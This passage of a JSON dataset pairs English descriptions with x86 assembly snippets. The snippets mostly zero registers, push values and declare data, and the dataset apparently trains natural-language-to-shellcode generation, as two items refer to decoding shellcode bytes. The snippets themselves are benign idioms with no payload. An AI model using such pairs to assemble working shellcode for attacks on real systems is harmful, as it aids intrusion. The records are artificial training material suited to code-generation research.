      "move",
      "next",
      "byte",
      "shellcode",
      "lower",
      "byte",
      "register"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "ecx",
      "\\n",
      "mov",
      "dl",
      ",",
      "[",
      "esi+1",
      "]"
    ]
  },
  {
    "intent": "clear the edx register and move the next byte of the shellcode into the lower byte of the register",
    "rewritten_intent": "clear the edx register and move the next byte of the shellcode into the lower byte of the register",
    "snippet": "xor edx, ecx \\n mov dl, [esi+1]",
    "slot_map": {
      "edx": "var0"
    },
    "intent_tokens": [
      "clear",
      "var0",
      "register",
      "and",
      "move",
      "next",
      "byte",
      "shellcode",
      "lower",
      "byte",
      "register"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "ecx",
      "\\n",
      "mov",
      "dl",
      ",",
      "[",
      "esi+1",
      "]"
    ]
  },
  {
    "intent": "initialize edx with the decimal value 0",
    "rewritten_intent": "initialize edx with the decimal value 0",
    "snippet": "xor edx, edx",
    "slot_map": {
      "edx": "var0"
    },
    "intent_tokens": [
      "initialize",
      "var0",
      "decimal",
      "value",
      "0"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0"
    ]
  },
  {
    "intent": "initialize edx with the hexadecimal value 0x0",
    "rewritten_intent": "initialize edx with the hexadecimal value 0x0",
    "snippet": "xor edx, edx",
    "slot_map": {
      "0x0": "var1",
      "edx": "var0"
    },
    "intent_tokens": [
      "initialize",
      "var0",
      "hexadecimal",
      "value",
      "var1"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0"
    ]
  },
  {
    "intent": "clear the edx register",
    "rewritten_intent": "clear the edx register",
    "snippet": "xor edx, edx",
    "slot_map": {
      "edx": "var0"
    },
    "intent_tokens": [
      "clear",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0"
    ]
  },
  {
    "intent": "set the contents of edx to zero",
    "rewritten_intent": "set the contents of edx to zero",
    "snippet": "xor edx, edx",
    "slot_map": {
      "edx": "var0"
    },
    "intent_tokens": [
      "set",
      "contents",
      "var0",
      "zero"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0"
    ]
  },
  {
    "intent": "set the edx register to null",
    "rewritten_intent": "set the edx register to null",
    "snippet": "xor edx, edx",
    "slot_map": {
      "edx": "var0"
    },
    "intent_tokens": [
      "set",
      "var0",
      "register",
      "null"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0"
    ]
  },
  {
    "intent": "zero out edx",
    "rewritten_intent": "zero out edx",
    "snippet": "xor edx, edx",
    "slot_map": {
      "edx": "var0"
    },
    "intent_tokens": [
      "zero",
      "out",
      "var0"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0"
    ]
  },
  {
    "intent": "zero out the edx register",
    "rewritten_intent": "zero out the edx register",
    "snippet": "xor edx, edx",
    "slot_map": {
      "edx": "var0"
    },
    "intent_tokens": [
      "zero",
      "out",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0"
    ]
  },
  {
    "intent": "clear edx register",
    "rewritten_intent": "clear edx register",
    "snippet": "xor edx, edx",
    "slot_map": {
      "edx": "var0"
    },
    "intent_tokens": [
      "clear",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0"
    ]
  },
  {
    "intent": "reset edx to 0",
    "rewritten_intent": "reset edx to 0",
    "snippet": "xor edx, edx",
    "slot_map": {
      "edx": "var0"
    },
    "intent_tokens": [
      "reset",
      "var0",
      "0"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0"
    ]
  },
  {
    "intent": "clear edx",
    "rewritten_intent": "clear edx",
    "snippet": "xor edx, edx",
    "slot_map": {
      "edx": "var0"
    },
    "intent_tokens": [
      "clear",
      "var0"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0"
    ]
  },
  {
    "intent": "zero out the edx register and jump to the l2 label if the contents of the ecx register is equal to the contents of the edx register",
    "rewritten_intent": "zero out the edx register and jump to the l2 label if the contents of the ecx register is equal to the contents of the edx register",
    "snippet": "xor edx, edx \\n cmp ecx, edx \\n je l2",
    "slot_map": {
      "edx": "var0",
      "l2": "var2",
      "ecx": "var3"
    },
    "intent_tokens": [
      "zero",
      "out",
      "var0",
      "register",
      "and",
      "jump",
      "var2",
      "label",
      "if",
      "contents",
      "var3",
      "register",
      "equal",
      "contents",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0",
      "\\n",
      "cmp",
      "var3",
      ",",
      "var0",
      "\\n",
      "je",
      "var2"
    ]
  },
  {
    "intent": "zero out edx and move 0x3 in the lowest byte of the register",
    "rewritten_intent": "zero out edx and move 0x3 in the lowest byte of the register",
    "snippet": "xor edx, edx \\n mov dl, 0x3",
    "slot_map": {
      "0x3": "var1",
      "edx": "var0"
    },
    "intent_tokens": [
      "zero",
      "out",
      "var0",
      "and",
      "move",
      "var1",
      "lowest",
      "byte",
      "register"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0",
      "\\n",
      "mov",
      "dl",
      ",",
      "var1"
    ]
  },
  {
    "intent": "clear edx and move 0x4 in the lowest byte of the register",
    "rewritten_intent": "clear edx and move 0x4 in the lowest byte of the register",
    "snippet": "xor edx, edx \\n mov dl, 0x4",
    "slot_map": {
      "0x4": "var1",
      "edx": "var0"
    },
    "intent_tokens": [
      "clear",
      "var0",
      "and",
      "move",
      "var1",
      "lowest",
      "byte",
      "register"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0",
      "\\n",
      "mov",
      "dl",
      ",",
      "var1"
    ]
  },
  {
    "intent": "clear the edx register and move 2 in the lowest byte of the register",
    "rewritten_intent": "clear the edx register and move 2 in the lowest byte of the register",
    "snippet": "xor edx, edx \\n mov dl, 2",
    "slot_map": {
      "edx": "var0"
    },
    "intent_tokens": [
      "clear",
      "var0",
      "register",
      "and",
      "move",
      "2",
      "lowest",
      "byte",
      "register"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0",
      "\\n",
      "mov",
      "dl",
      ",",
      "2"
    ]
  },
  {
    "intent": "zero out eax and edx",
    "rewritten_intent": "zero out eax and edx",
    "snippet": "xor edx, edx \\n mul edx",
    "slot_map": {
      "eax": "var0",
      "edx": "var1"
    },
    "intent_tokens": [
      "zero",
      "out",
      "var0",
      "and",
      "var1"
    ],
    "snippet_tokens": [
      "xor",
      "var1",
      ",",
      "var1",
      "\\n",
      "mul",
      "var1"
    ]
  },
  {
    "intent": "zero out the eax and edx register",
    "rewritten_intent": "zero out the eax and edx register",
    "snippet": "xor edx, edx \\n mul edx",
    "slot_map": {
      "eax": "var0",
      "edx": "var1"
    },
    "intent_tokens": [
      "zero",
      "out",
      "var0",
      "and",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "xor",
      "var1",
      ",",
      "var1",
      "\\n",
      "mul",
      "var1"
    ]
  },
  {
    "intent": "zero out the edx register and push zero onto the stack",
    "rewritten_intent": "zero out the edx register and push zero onto the stack",
    "snippet": "xor edx, edx \\n push edx",
    "slot_map": {
      "edx": "var0"
    },
    "intent_tokens": [
      "zero",
      "out",
      "var0",
      "register",
      "and",
      "push",
      "zero",
      "stack"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0",
      "\\n",
      "push",
      "var0"
    ]
  },
  {
    "intent": "push zero onto the stack",
    "rewritten_intent": "push zero onto the stack",
    "snippet": "xor edx, edx \\n push edx",
    "slot_map": {},
    "intent_tokens": [
      "push",
      "zero",
      "stack"
    ],
    "snippet_tokens": [
      "xor",
      "edx",
      ",",
      "edx",
      "\\n",
      "push",
      "edx"
    ]
  },
  {
    "intent": "clear the edx register and push its contents onto the stack",
    "rewritten_intent": "clear the edx register and push its contents onto the stack",
    "snippet": "xor edx, edx \\n push edx",
    "slot_map": {
      "edx": "var0"
    },
    "intent_tokens": [
      "clear",
      "var0",
      "register",
      "and",
      "push",
      "its",
      "contents",
      "stack"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0",
      "\\n",
      "push",
      "var0"
    ]
  },
  {
    "intent": "initialize the esi register with the decimal value 0",
    "rewritten_intent": "initialize the esi register with the decimal value 0",
    "snippet": "xor esi, esi",
    "slot_map": {
      "esi": "var0"
    },
    "intent_tokens": [
      "initialize",
      "var0",
      "register",
      "decimal",
      "value",
      "0"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0"
    ]
  },
  {
    "intent": "init the esi register to 0",
    "rewritten_intent": "init the esi register to 0",
    "snippet": "xor esi, esi",
    "slot_map": {
      "init": "var0",
      "esi": "var1"
    },
    "intent_tokens": [
      "var0",
      "var1",
      "register",
      "0"
    ],
    "snippet_tokens": [
      "xor",
      "var1",
      ",",
      "var1"
    ]
  },
  {
    "intent": "clear the esi register",
    "rewritten_intent": "clear the esi register",
    "snippet": "xor esi, esi",
    "slot_map": {
      "esi": "var0"
    },
    "intent_tokens": [
      "clear",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0"
    ]
  },
  {
    "intent": "clear zero_reg",
    "rewritten_intent": "clear zero_reg",
    "snippet": "xor zero_reg, zero_reg",
    "slot_map": {
      "zero_reg": "var0"
    },
    "intent_tokens": [
      "clear",
      "var0"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var0"
    ]
  },
  {
    "intent": "declare a doubleword at address y initialized to contain 3000",
    "rewritten_intent": "declare a doubleword at address y initialized to contain 3000",
    "snippet": "y dd 3000",
    "slot_map": {},
    "intent_tokens": [
      "declare",
      "doubleword",
      "address",
      "y",
      "initialized",
      "contain",
      "3000"
    ],
    "snippet_tokens": [
      "y",
      "dd",
      "3000"
    ]
  },
  {
    "intent": "create the doubleword variable y in memory and initialize it to zero",
    "rewritten_intent": "create the doubleword variable y in memory and initialize it to zero",
    "snippet": "y: dd 0x0",
    "slot_map": {},
    "intent_tokens": [
      "create",
      "doubleword",
      "variable",
      "y",
      "memory",
      "and",
      "initialize",
      "it",
      "zero"
    ],
    "snippet_tokens": [
      "y",
      ":",
      "dd",
      "0x0"
    ]
  },
  {
    "intent": "reserve one word for ymmval",
    "rewritten_intent": "reserve one word for ymmval",
    "snippet": "ymmval: resw 1",
    "slot_map": {
      "for": "var0",
      "ymmval": "var1"
    },
    "intent_tokens": [
      "reserve",
      "one",
      "word",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "var1",
      ":",
      "resw",
      "1"
    ]
  },
  {
    "intent": "declare three doubleword values initialized to 1 2 and 3 at address z",
    "rewritten_intent": "declare three doubleword values initialized to 1 2 and 3 at address z",
    "snippet": "z dd 1, 2, 3",
    "slot_map": {},
    "intent_tokens": [
      "declare",
      "three",
      "doubleword",
      "values",
      "initialized",
      "1",
      "2",
      "and",
      "3",
      "address",
      "z"
    ],
    "snippet_tokens": [
      "z",
      "dd",
      "1",
      ",",
      "2",
      ",",
      "3"
    ]
  },
  {
    "intent": "declare three doublewords of memory starting at address z and initialized to 1 2 and 3",
    "rewritten_intent": "declare three doublewords of memory starting at address z and initialized to 1 2 and 3",
    "snippet": "z dd 1,2,3",
    "slot_map": {
      "doublewords": "var0"
    },
    "intent_tokens": [
      "declare",
      "three",
      "var0",
      "memory",
      "starting",
      "address",
      "z",
      "and",
      "initialized",
      "1",
      "2",
      "and",
      "3"
    ],
    "snippet_tokens": [
      "z",
      "dd",
      "1,2,3"
    ]
  },
  {
    "intent": "create the doubleword variable z in memory and initialize it to zero",
    "rewritten_intent": "create the doubleword variable z in memory and initialize it to zero",
    "snippet": "z: dd 0x0",
    "slot_map": {},
    "intent_tokens": [
      "create",
      "doubleword",
      "variable",
      "z",
      "memory",
      "and",
      "initialize",
      "it",
      "zero"
    ],
    "snippet_tokens": [
      "z",
      ":",
      "dd",
      "0x0"
    ]
  }
]